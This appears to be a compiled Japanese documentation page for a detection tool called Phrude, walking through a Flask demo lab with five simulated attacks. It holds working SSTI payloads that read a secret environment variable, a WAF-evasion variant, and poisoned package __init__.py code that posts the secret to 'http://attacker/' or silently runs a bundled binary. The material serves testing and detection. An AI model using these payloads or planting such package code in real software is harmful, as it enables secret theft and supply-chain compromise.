"use strict";(self.webpackChunkphrude_doc=self.webpackChunkphrude_doc||[]).push([[814],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>m});var a=n(7294);function l(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function p(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){l(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function o(e,t){if(null==e)return{};var n,a,l=function(e,t){if(null==e)return{};var n,a,l={},r=Object.keys(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||(l[n]=e[n]);return l}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(l[n]=e[n])}return l}var i=a.createContext({}),u=function(e){var t=a.useContext(i),n=t;return e&&(n="function"==typeof e?e(t):p(p({},t),e)),n},c=function(e){var t=u(e.components);return a.createElement(i.Provider,{value:t},e.children)},s="mdxType",k={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,l=e.mdxType,r=e.originalType,i=e.parentName,c=o(e,["components","mdxType","originalType","parentName"]),s=u(n),d=l,m=s["".concat(i,".").concat(d)]||s[d]||k[d]||r;return n?a.createElement(m,p(p({ref:t},c),{},{components:n})):a.createElement(m,p({ref:t},c))}));function m(e,t){var n=arguments,l=t&&t.mdxType;if("string"==typeof e||l){var r=n.length,p=new Array(r);p[0]=d;var o={};for(var i in t)hasOwnProperty.call(t,i)&&(o[i]=t[i]);o.originalType=e,o[s]="string"==typeof e?e:l,p[1]=o;for(var u=2;u<r;u++)p[u]=n[u];return a.createElement.apply(null,p)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},7020:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>i,contentTitle:()=>p,default:()=>s,frontMatter:()=>r,metadata:()=>o,toc:()=>u});var a=n(7462),l=(n(7294),n(3905));const r={sidebar_position:4},p="\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea\u306e\u89e3\u8aac",o={unversionedId:"demo",id:"demo",title:"\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea\u306e\u89e3\u8aac",description:"Phrude\u306e\u691c\u8a3c\u3067\u7528\u3044\u305fPython Flask\u88fd\u306e\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea\u3092  \u3067\u516c\u958b\u3057\u3066\u3044\u307e\u3059\u3002",source:"@site/docs/demo.md",sourceDirName:".",slug:"/demo",permalink:"/docs/demo",draft:!1,editUrl:"https://github.com/phrude/phrude.github.io/tree/main/docs/demo.md",tags:[],version:"current",sidebarPosition:4,frontMatter:{sidebar_position:4},sidebar:"tutorialSidebar",previous:{title:"\u691c\u77e5\u30eb\u30fc\u30eb\u306e\u4f8b",permalink:"/docs/rule/example"}},i={},u=[{value:"\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea\u306e\u7acb\u3061\u4e0a\u3052",id:"\u30c7\u30e2\u7528web\u30a2\u30d7\u30ea\u306e\u7acb\u3061\u4e0a\u3052",level:2},{value:"\u64ec\u4f3c\u7684\u306a\u653b\u6483\u306e\u5b9f\u884c",id:"\u64ec\u4f3c\u7684\u306a\u653b\u6483\u306e\u5b9f\u884c",level:2},{value:"1. \u5916\u90e8\u304b\u3089\u306eHTTP\u30ea\u30af\u30a8\u30b9\u30c8\u7d4c\u7531\u306e\u653b\u6483",id:"1-\u5916\u90e8\u304b\u3089\u306ehttp\u30ea\u30af\u30a8\u30b9\u30c8\u7d4c\u7531\u306e\u653b\u6483",level:3},{value:"2. WAF\u306b\u691c\u77e5\u3055\u308c\u308b\u5916\u90e8\u304b\u3089\u306eHTTP\u30ea\u30af\u30a8\u30b9\u30c8\u7d4c\u7531\u306e\u653b\u6483",id:"2-waf\u306b\u691c\u77e5\u3055\u308c\u308b\u5916\u90e8\u304b\u3089\u306ehttp\u30ea\u30af\u30a8\u30b9\u30c8\u7d4c\u7531\u306e\u653b\u6483",level:3},{value:"3. WAF\u306e\u691c\u77e5\u3092\u56de\u907f\u3057\u305f\u5916\u90e8\u304b\u3089\u306eHTTP\u30ea\u30af\u30a8\u30b9\u30c8\u7d4c\u7531\u306e\u653b\u6483",id:"3-waf\u306e\u691c\u77e5\u3092\u56de\u907f\u3057\u305f\u5916\u90e8\u304b\u3089\u306ehttp\u30ea\u30af\u30a8\u30b9\u30c8\u7d4c\u7531\u306e\u653b\u6483",level:3},{value:"4. Python\u306e\u30b3\u30fc\u30c9\u3067\u653b\u6483\u51e6\u7406\u304c\u8a18\u8ff0\u3055\u308c\u3066\u3044\u308b\u6c5a\u67d3\u30e9\u30a4\u30d6\u30e9\u30ea\u306e\u6df7\u5165\u306b\u3088\u308b\u653b\u6483",id:"4-python\u306e\u30b3\u30fc\u30c9\u3067\u653b\u6483\u51e6\u7406\u304c\u8a18\u8ff0\u3055\u308c\u3066\u3044\u308b\u6c5a\u67d3\u30e9\u30a4\u30d6\u30e9\u30ea\u306e\u6df7\u5165\u306b\u3088\u308b\u653b\u6483",level:3},{value:"5. \u30de\u30eb\u30a6\u30a7\u30a2\u30d0\u30a4\u30ca\u30ea\u3092\u5b9f\u884c\u3059\u308b\u6c5a\u67d3\u30e9\u30a4\u30d6\u30e9\u30ea\u306e\u6df7\u5165\u306b\u3088\u308b\u653b\u6483",id:"5-\u30de\u30eb\u30a6\u30a7\u30a2\u30d0\u30a4\u30ca\u30ea\u3092\u5b9f\u884c\u3059\u308b\u6c5a\u67d3\u30e9\u30a4\u30d6\u30e9\u30ea\u306e\u6df7\u5165\u306b\u3088\u308b\u653b\u6483",level:3}],c={toc:u};function s(e){let{components:t,...n}=e;return(0,l.kt)("wrapper",(0,a.Z)({},c,n,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("h1",{id:"\u30c7\u30e2\u7528web\u30a2\u30d7\u30ea\u306e\u89e3\u8aac"},"\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea\u306e\u89e3\u8aac"),(0,l.kt)("p",null,"Phrude\u306e\u691c\u8a3c\u3067\u7528\u3044\u305fPython Flask\u88fd\u306e\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea\u3092 ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/phrude/flask-demoapp"},"https://github.com/phrude/flask-demoapp")," \u3067\u516c\u958b\u3057\u3066\u3044\u307e\u3059\u3002"),(0,l.kt)("p",null,"Web\u30a2\u30d7\u30ea\u306b\u4efb\u610f\u306e\u51e6\u7406\u3092\u633f\u5165\u3059\u308b\u653b\u6483\u306e\u3046\u3061\u3001\u5916\u90e8\u304b\u3089\u306eHTTP\u30ea\u30af\u30a8\u30b9\u30c8\u7d4c\u7531\u306e\u653b\u6483\u3068\u3057\u3066SSTI\u3001\u5185\u90e8\u304b\u3089\u306e\u653b\u6483\u3068\u3057\u3066\u6c5a\u67d3\u30e9\u30a4\u30d6\u30e9\u30ea\u306e\u6df7\u5165(Python\u306e\u30b3\u30fc\u30c9\u3067\u653b\u6483\u51e6\u7406\u304c\u8a18\u8ff0\u3055\u308c\u3066\u3044\u308b\u3082\u306e\u30fb\u30de\u30eb\u30a6\u30a7\u30a2\u30d0\u30a4\u30ca\u30ea\u3092\u5b9f\u884c\u3059\u308b\u3082\u306e)\u304c\u5b9f\u88c5\u3055\u308c\u3066\u3044\u307e\u3059\u3002"),(0,l.kt)("h2",{id:"\u30c7\u30e2\u7528web\u30a2\u30d7\u30ea\u306e\u7acb\u3061\u4e0a\u3052"},"\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea\u306e\u7acb\u3061\u4e0a\u3052"),(0,l.kt)("p",null,"\u52d5\u4f5c\u3055\u305b\u308b\u305f\u3081\u306b\u306f"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://docs.docker.com/"},"Docker")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://docs.docker.com/compose/"},"Docker Compose"))),(0,l.kt)("p",null,"\u3092\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3057\u3066\u304f\u3060\u3055\u3044\u3002"),(0,l.kt)("p",null,"Docker\u304a\u3088\u3073Docker Compose\u3092\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u5f8c\u3001",(0,l.kt)("inlineCode",{parentName:"p"},"docker compose up -d"),"\u30b3\u30de\u30f3\u30c9\u3067"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"http://localhost:8080"},"http://localhost:8080")," Python Flask\u88fd\u306e\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea"),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"http://localhost:8081"},"http://localhost:8081")," \u30aa\u30fc\u30d7\u30f3\u30bd\u30fc\u30b9\u306eWAF ",(0,l.kt)("a",{parentName:"li",href:"https://github.com/SpiderLabs/ModSecurity"},"ModSecurity"),"\u3092\u9069\u7528\u3057\u4fdd\u8b77\u3057\u305fPython Flask\u88fd\u306e\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea"),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"http://localhost:8082"},"http://localhost:8082")," \u653b\u6483\u306e\u5b9f\u884c\u6642\u306b\u6d41\u51fa\u3055\u305b\u305f\u60c5\u5831\u3092\u53d7\u3051\u53d6\u308b\u3001\u653b\u6483\u8005\u306e\u6a21\u64ec\u30b5\u30fc\u30d0\u30fc")),(0,l.kt)("p",null,"\u304c\u8d77\u52d5\u3057\u307e\u3059\u3002"),(0,l.kt)("h2",{id:"\u64ec\u4f3c\u7684\u306a\u653b\u6483\u306e\u5b9f\u884c"},"\u64ec\u4f3c\u7684\u306a\u653b\u6483\u306e\u5b9f\u884c"),(0,l.kt)("p",null,"\u4ee5\u4e0b\u306e5\u3064\u306e\u64ec\u4f3c\u7684\u306a\u653b\u6483\u3092\u5b9f\u884c\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002"),(0,l.kt)("h3",{id:"1-\u5916\u90e8\u304b\u3089\u306ehttp\u30ea\u30af\u30a8\u30b9\u30c8\u7d4c\u7531\u306e\u653b\u6483"},"1. \u5916\u90e8\u304b\u3089\u306eHTTP\u30ea\u30af\u30a8\u30b9\u30c8\u7d4c\u7531\u306e\u653b\u6483"),(0,l.kt)("p",null,"\u4ee5\u4e0b\u306e\u3088\u3046\u306acurl\u30b3\u30de\u30f3\u30c9\u306e\u5b9f\u884c"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"curl -X POST http://localhost:8080/ssti -d name=\"{{request.application.__globals__.__builtins__.__import__('os').getenv('CLOUD_SECRET_KEY')}}\"\n")),(0,l.kt)("p",null,"\u3082\u3057\u304f\u306f ",(0,l.kt)("a",{parentName:"p",href:"http://localhost:8080"},"http://localhost:8080")," \u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea\u306b"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"{{request.application.__globals__.__builtins__.__import__('os').getenv('CLOUD_SECRET_KEY')}}\n")),(0,l.kt)("p",null,"\u3092\u5165\u529b\u3057",(0,l.kt)("inlineCode",{parentName:"p"},"Send"),"\u30dc\u30bf\u30f3\u3092\u30af\u30ea\u30c3\u30af\u3057\u3066\u304f\u3060\u3055\u3044\u3002"),(0,l.kt)("p",null,"\u753b\u9762\u306b ",(0,l.kt)("inlineCode",{parentName:"p"},"Hello wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY."),"\u3068\u8868\u793a\u3055\u308c\u307e\u3059\u3002"),(0,l.kt)("p",null,"\u3053\u306e",(0,l.kt)("inlineCode",{parentName:"p"},"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),"\u306f\u74b0\u5883\u5909\u6570\u306b\u683c\u7d0d\u3055\u308c\u3066\u3044\u308b\u79d8\u5bc6\u306e\u9375\u3067\u3001\u3082\u3057\u3053\u306e\u9375\u304c\u30af\u30e9\u30a6\u30c9\u306e\u30ea\u30bd\u30fc\u30b9\u3078\u30a2\u30af\u30bb\u30b9\u3059\u308b\u305f\u3081\u306e\u3082\u306e\u3067\u3042\u308b\u5834\u5408\u3001\u3053\u306e\u3088\u3046\u306a\u653b\u6483\u306b\u3088\u308b\u6d41\u51fa\u306b\u3088\u3063\u3066\u30af\u30e9\u30a6\u30c9\u306e\u30ea\u30bd\u30fc\u30b9\u306e\u4e0d\u6b63\u306a\u4f7f\u7528\u3084\u60c5\u5831\u6d41\u51fa\u306b\u7e4b\u304c\u308a\u307e\u3059\u3002"),(0,l.kt)("h3",{id:"2-waf\u306b\u691c\u77e5\u3055\u308c\u308b\u5916\u90e8\u304b\u3089\u306ehttp\u30ea\u30af\u30a8\u30b9\u30c8\u7d4c\u7531\u306e\u653b\u6483"},"2. WAF\u306b\u691c\u77e5\u3055\u308c\u308b\u5916\u90e8\u304b\u3089\u306eHTTP\u30ea\u30af\u30a8\u30b9\u30c8\u7d4c\u7531\u306e\u653b\u6483"),(0,l.kt)("p",null,"\u5148\u7a0b\u306e\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea\u306b\u30aa\u30fc\u30d7\u30f3\u30bd\u30fc\u30b9\u306eWAF ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/SpiderLabs/ModSecurity"},"ModSecurity"),"\u3092\u9069\u7528\u3057\u4fdd\u8b77\u3057\u305f\u3082\u306e\u3067\u540c\u3058\u3088\u3046\u306b"),(0,l.kt)("p",null,"\u4ee5\u4e0b\u306e\u3088\u3046\u306acurl\u30b3\u30de\u30f3\u30c9\u306e\u5b9f\u884c"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"curl -X POST http://localhost:8081/ssti -d name=\"{{request.application.__globals__.__builtins__.__import__('os').getenv('CLOUD_SECRET_KEY')}}\"\n")),(0,l.kt)("p",null,"\u3082\u3057\u304f\u306f ",(0,l.kt)("a",{parentName:"p",href:"http://localhost:8081"},"http://localhost:8081")," \u30aa\u30fc\u30d7\u30f3\u30bd\u30fc\u30b9\u306eWAF ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/SpiderLabs/ModSecurity"},"ModSecurity"),"\u3092\u9069\u7528\u3057\u4fdd\u8b77\u3057\u305f\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea\u306b"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"{{request.application.__globals__.__builtins__.__import__('os').getenv('CLOUD_SECRET_KEY')}}\n")),(0,l.kt)("p",null,"\u3092\u5165\u529b\u3057",(0,l.kt)("inlineCode",{parentName:"p"},"Send"),"\u30dc\u30bf\u30f3\u3092\u30af\u30ea\u30c3\u30af\u3057\u3066\u304f\u3060\u3055\u3044\u3002"),(0,l.kt)("p",null,(0,l.kt)("inlineCode",{parentName:"p"},"403 Forbidden"),"\u30a8\u30e9\u30fc\u304c\u753b\u9762\u306b\u8868\u793a\u3055\u308c\u307e\u3059\u3002"),(0,l.kt)("p",null,"WAF\u306fHTTP\u30ea\u30af\u30a8\u30b9\u30c8\u306e\u6587\u5b57\u5217\u306b\u542b\u307e\u308c\u308b\u3001\u653b\u6483\u306b\u7279\u6709\u306e\u6587\u5b57\u5217\u3092\u898b\u3064\u3051\u308b\u3053\u3068\u3067\u305d\u306eHTTP\u30ea\u30af\u30a8\u30b9\u30c8\u304c\u653b\u6483\u3067\u3042\u308b\u304b\u3092\u5224\u65ad\u3057\u307e\u3059\u3002"),(0,l.kt)("p",null,(0,l.kt)("inlineCode",{parentName:"p"},"docker logs flask-demoapp-modsecurity-1"),"\u30b3\u30de\u30f3\u30c9\u3067\u30aa\u30fc\u30d7\u30f3\u30bd\u30fc\u30b9\u306eWAF ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/SpiderLabs/ModSecurity"},"ModSecurity"),"\u306e\u30ed\u30b0\u3092\u78ba\u8a8d\u3059\u308b\u3068",(0,l.kt)("inlineCode",{parentName:"p"},"PHP Injection Attack: High-Risk PHP Function Call Found"),"\u3068\u3044\u3046\u30eb\u30fc\u30eb\u306b\u62b5\u89e6\u3057\u3001\u653b\u6483\u3067\u3042\u308b\u3068\u5224\u65ad\u3055\u308c\u305f\u3053\u3068\u304c\u5206\u304b\u308a\u307e\u3059\u3002"),(0,l.kt)("h3",{id:"3-waf\u306e\u691c\u77e5\u3092\u56de\u907f\u3057\u305f\u5916\u90e8\u304b\u3089\u306ehttp\u30ea\u30af\u30a8\u30b9\u30c8\u7d4c\u7531\u306e\u653b\u6483"},"3. WAF\u306e\u691c\u77e5\u3092\u56de\u907f\u3057\u305f\u5916\u90e8\u304b\u3089\u306eHTTP\u30ea\u30af\u30a8\u30b9\u30c8\u7d4c\u7531\u306e\u653b\u6483"),(0,l.kt)("p",null,"\u30aa\u30fc\u30d7\u30f3\u30bd\u30fc\u30b9\u306eWAF ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/SpiderLabs/ModSecurity"},"ModSecurity"),"\u306e\u691c\u77e5\u3092\u56de\u907f\u3059\u308b\u3088\u3046\u7d30\u5de5\u3057\u305f\u653b\u6483\u6587\u5b57\u5217\u3092\u9001\u4fe1\u3057\u307e\u3059"),(0,l.kt)("p",null,"\u4ee5\u4e0b\u306e\u3088\u3046\u306acurl\u30b3\u30de\u30f3\u30c9\u306e\u5b9f\u884c"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"curl -X POST http://localhost:8081/ssti -d name=\"{{(request.application.__globals__.__builtins__.__import__('os')|attr('ge'+'tenv')).__call__('CLOUD_SECRET_KEY')}}\"\n")),(0,l.kt)("p",null,"\u3082\u3057\u304f\u306f ",(0,l.kt)("a",{parentName:"p",href:"http://localhost:8081"},"http://localhost:8081")," \u30aa\u30fc\u30d7\u30f3\u30bd\u30fc\u30b9\u306eWAF ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/SpiderLabs/ModSecurity"},"ModSecurity"),"\u3092\u9069\u7528\u3057\u4fdd\u8b77\u3057\u305f\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea\u306b"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"{{(request.application.__globals__.__builtins__.__import__('os')|attr('ge'+'tenv')).__call__('CLOUD_SECRET_KEY')}}\n")),(0,l.kt)("p",null,"\u3092\u5165\u529b\u3057",(0,l.kt)("inlineCode",{parentName:"p"},"Send"),"\u30dc\u30bf\u30f3\u3092\u30af\u30ea\u30c3\u30af\u3057\u3066\u304f\u3060\u3055\u3044\u3002"),(0,l.kt)("p",null,"\u753b\u9762\u306b ",(0,l.kt)("inlineCode",{parentName:"p"},"Hello wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY."),"\u3068\u8868\u793a\u3055\u308c\u307e\u3059\u3002"),(0,l.kt)("p",null,"\u30aa\u30fc\u30d7\u30f3\u30bd\u30fc\u30b9\u306eWAF ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/SpiderLabs/ModSecurity"},"ModSecurity"),"\u306e\u691c\u77e5\u3092\u56de\u907f\u3057\u3001\u74b0\u5883\u5909\u6570\u306b\u683c\u7d0d\u3055\u308c\u3066\u3044\u308b\u79d8\u5bc6\u306e\u9375",(0,l.kt)("inlineCode",{parentName:"p"},"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"),"\u3092\u6d41\u51fa\u3055\u305b\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3057\u305f\u3002"),(0,l.kt)("h3",{id:"4-python\u306e\u30b3\u30fc\u30c9\u3067\u653b\u6483\u51e6\u7406\u304c\u8a18\u8ff0\u3055\u308c\u3066\u3044\u308b\u6c5a\u67d3\u30e9\u30a4\u30d6\u30e9\u30ea\u306e\u6df7\u5165\u306b\u3088\u308b\u653b\u6483"},"4. Python\u306e\u30b3\u30fc\u30c9\u3067\u653b\u6483\u51e6\u7406\u304c\u8a18\u8ff0\u3055\u308c\u3066\u3044\u308b\u6c5a\u67d3\u30e9\u30a4\u30d6\u30e9\u30ea\u306e\u6df7\u5165\u306b\u3088\u308b\u653b\u6483"),(0,l.kt)("p",null,"\u3053\u306e\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea\u304c\u5c0e\u5165\u3057\u3066\u3044\u308b\u30e9\u30a4\u30d6\u30e9\u30eastealer_package\u3067\u306f",(0,l.kt)("inlineCode",{parentName:"p"},"__init__.py"),"\u30d5\u30a1\u30a4\u30eb\u306b\u4e0d\u5be9\u306a\u51e6\u7406\u304c\u8a18\u8ff0\u3055\u308c\u3066\u3044\u307e\u3059\u3002"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-python"},'try:\n    import os\n    import requests\n\n    # Get an environment variable\n    secret = os.getenv("CLOUD_SECRET_KEY")\n    requests.post("http://attacker/", data={"CLOUD_SECRET_KEY": secret})\nexcept:\n    pass\n')),(0,l.kt)("p",null,"\u3053\u3053\u3067\u306fgetenv\u95a2\u6570\u3067\u74b0\u5883\u5909\u6570\u306b\u683c\u7d0d\u3055\u308c\u3066\u3044\u308b\u79d8\u5bc6\u306e\u9375\u3092\u53d6\u5f97\u3057\u3001\u5916\u90e8\u306e\u30b5\u30fc\u30d0\u30fc",(0,l.kt)("inlineCode",{parentName:"p"},"http://attacker/"),"\u3078\u9001\u4fe1\u3057\u3066\u3044\u307e\u3059\u3002"),(0,l.kt)("p",null,"\u30e9\u30a4\u30d6\u30e9\u30eastealer_package\u3067\u63d0\u4f9b\u3055\u308c\u3066\u3044\u308b\u6a5f\u80fd\u3092\u4f7f\u3046\u51e6\u7406\u3092\u5b9f\u884c\u3057\u307e\u3059\u3002"),(0,l.kt)("p",null,"\u4ee5\u4e0b\u306e\u3088\u3046\u306acurl\u30b3\u30de\u30f3\u30c9\u306e\u5b9f\u884c"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"curl http://localhost:8081/stealer\n")),(0,l.kt)("p",null,"\u3082\u3057\u304f\u306f ",(0,l.kt)("a",{parentName:"p",href:"http://localhost:8081/stealer"},"http://localhost:8081/stealer")," \u3078\u30d6\u30e9\u30a6\u30b6\u3067\u30a2\u30af\u30bb\u30b9\u3057\u3066\u304f\u3060\u3055\u3044\u3002"),(0,l.kt)("p",null,"\u753b\u9762\u306b ",(0,l.kt)("inlineCode",{parentName:"p"},"Stealer demo is executed"),"\u3068\u8868\u793a\u3055\u308c\u307e\u3059\u3002"),(0,l.kt)("p",null,"\u3053\u306e\u3068\u304d\u3001\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea\u304c\u5c0e\u5165\u3057\u3066\u3044\u308b\u30e9\u30a4\u30d6\u30e9\u30eastealer_package\u5185\u306e\u4e0d\u5be9\u306a\u51e6\u7406\u304c\u5b9f\u884c\u3055\u308c\u3001\u79d8\u5bc6\u306e\u9375\u304c\u653b\u6483\u8005\u306e\u30b5\u30fc\u30d0\u30fc",(0,l.kt)("inlineCode",{parentName:"p"},"http://attacker/"),"\u306b\u9001\u4fe1\u3055\u308c\u6d41\u51fa\u3057\u307e\u3057\u305f\u3002"),(0,l.kt)("p",null,"\u653b\u6483\u8005\u306e\u6a21\u64ec\u30b5\u30fc\u30d0\u30fc ",(0,l.kt)("a",{parentName:"p",href:"http://localhost:8082"},"http://localhost:8082")," \u3092\u78ba\u8a8d\u3059\u308b\u3068"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"[{'CLOUD_SECRET_KEY': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'}]\n")),(0,l.kt)("p",null,"\u3068\u79d8\u5bc6\u306e\u9375\u304c\u653b\u6483\u8005\u306e\u624b\u306b\u6e21\u3063\u3066\u3044\u308b\u3053\u3068\u304c\u78ba\u8a8d\u3067\u304d\u307e\u3059\u3002"),(0,l.kt)("h3",{id:"5-\u30de\u30eb\u30a6\u30a7\u30a2\u30d0\u30a4\u30ca\u30ea\u3092\u5b9f\u884c\u3059\u308b\u6c5a\u67d3\u30e9\u30a4\u30d6\u30e9\u30ea\u306e\u6df7\u5165\u306b\u3088\u308b\u653b\u6483"},"5. \u30de\u30eb\u30a6\u30a7\u30a2\u30d0\u30a4\u30ca\u30ea\u3092\u5b9f\u884c\u3059\u308b\u6c5a\u67d3\u30e9\u30a4\u30d6\u30e9\u30ea\u306e\u6df7\u5165\u306b\u3088\u308b\u653b\u6483"),(0,l.kt)("p",null,"\u3053\u306e\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea\u304c\u5c0e\u5165\u3057\u3066\u3044\u308b\u30e9\u30a4\u30d6\u30e9\u30eamalware_package\u3067\u306f",(0,l.kt)("inlineCode",{parentName:"p"},"__init__.py"),"\u30d5\u30a1\u30a4\u30eb\u306b\u4e0d\u5be9\u306a\u51e6\u7406\u304c\u8a18\u8ff0\u3055\u308c\u3066\u3044\u307e\u3059\u3002"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-python"},'try:\n    import subprocess\n    import os\n\n    # Run malware\n    subprocess.Popen(\n        os.path.join(os.path.dirname(os.path.abspath(__file__)), "malware"),\n        stdout=subprocess.DEVNULL,\n        stderr=subprocess.DEVNULL,\n        stdin=subprocess.DEVNULL,\n    )\nexcept:\n    pass\n')),(0,l.kt)("p",null,"\u3053\u3053\u3067\u306f\u30d1\u30c3\u30b1\u30fc\u30b8\u306b\u540c\u68b1\u3055\u308c\u305f\u5b9f\u884c\u53ef\u80fd\u30d5\u30a1\u30a4\u30eb",(0,l.kt)("inlineCode",{parentName:"p"},"malware"),"\u3092\u5b9f\u884c\u3057\u3066\u3044\u307e\u3059\u3002"),(0,l.kt)("p",null,"\u30e9\u30a4\u30d6\u30e9\u30eamalware_package\u3067\u63d0\u4f9b\u3055\u308c\u3066\u3044\u308b\u6a5f\u80fd\u3092\u4f7f\u3046\u51e6\u7406\u3092\u5b9f\u884c\u3057\u307e\u3059\u3002"),(0,l.kt)("p",null,"\u4ee5\u4e0b\u306e\u3088\u3046\u306acurl\u30b3\u30de\u30f3\u30c9\u306e\u5b9f\u884c"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"curl http://localhost:8081/malware\n")),(0,l.kt)("p",null,"\u3082\u3057\u304f\u306f ",(0,l.kt)("a",{parentName:"p",href:"http://localhost:8081/malware"},"http://localhost:8081/malware")," \u3078\u30d6\u30e9\u30a6\u30b6\u3067\u30a2\u30af\u30bb\u30b9\u3057\u3066\u304f\u3060\u3055\u3044\u3002"),(0,l.kt)("p",null,"\u753b\u9762\u306b ",(0,l.kt)("inlineCode",{parentName:"p"},"Malware demo is executed"),"\u3068\u8868\u793a\u3055\u308c\u307e\u3059\u3002"),(0,l.kt)("p",null,"\u3053\u306e\u3068\u304d\u3001\u30c7\u30e2\u7528Web\u30a2\u30d7\u30ea\u304c\u5c0e\u5165\u3057\u3066\u3044\u308b\u30e9\u30a4\u30d6\u30e9\u30eamalware_package\u5185\u306e\u4e0d\u5be9\u306a\u51e6\u7406\u304c\u5b9f\u884c\u3055\u308c\u3001\u5b9f\u884c\u53ef\u80fd\u30d5\u30a1\u30a4\u30eb",(0,l.kt)("inlineCode",{parentName:"p"},"malware"),"\u306b\u3088\u3063\u3066\u30db\u30b9\u30c8\u540d\u304c\u653b\u6483\u8005\u306e\u30b5\u30fc\u30d0\u30fc",(0,l.kt)("inlineCode",{parentName:"p"},"http://attacker/"),"\u306b\u9001\u4fe1\u3055\u308c\u6d41\u51fa\u3057\u307e\u3057\u305f\u3002"),(0,l.kt)("p",null,"\u653b\u6483\u8005\u306e\u6a21\u64ec\u30b5\u30fc\u30d0\u30fc ",(0,l.kt)("a",{parentName:"p",href:"http://localhost:8082"},"http://localhost:8082")," \u3092\u78ba\u8a8d\u3059\u308b\u3068"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"[{'hostname': '2c2c289ce392'}]\n")),(0,l.kt)("p",null,"\u3068\u30db\u30b9\u30c8\u540d\u304c\u653b\u6483\u8005\u306e\u624b\u306b\u6e21\u3063\u3066\u3044\u308b\u3053\u3068\u304c\u78ba\u8a8d\u3067\u304d\u307e\u3059\u3002"),(0,l.kt)("p",null,"\u3053\u306e\u3088\u3046\u306a\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u5b9f\u884c\u3067\u306f\u3001Phrude\u3067\u306fsubprocess\u30d1\u30c3\u30b1\u30fc\u30b8\u306b\u3088\u308a\u5b9f\u884c\u53ef\u80fd\u30d5\u30a1\u30a4\u30eb\u304c\u5b9f\u884c\u3055\u308c\u305f\u3053\u3068\u306e\u307f\u304c\u691c\u77e5\u3067\u304d\u307e\u3059\u304c\u3001\u30b7\u30b9\u30c6\u30e0\u30b3\u30fc\u30eb\u306b\u3088\u308b\u691c\u77e5\u30c4\u30fc\u30eb\u3092\u4f7f\u3046\u3053\u3068\u3067\u5b9f\u884c\u53ef\u80fd\u30d5\u30a1\u30a4\u30eb\u304c\u3069\u306e\u3088\u3046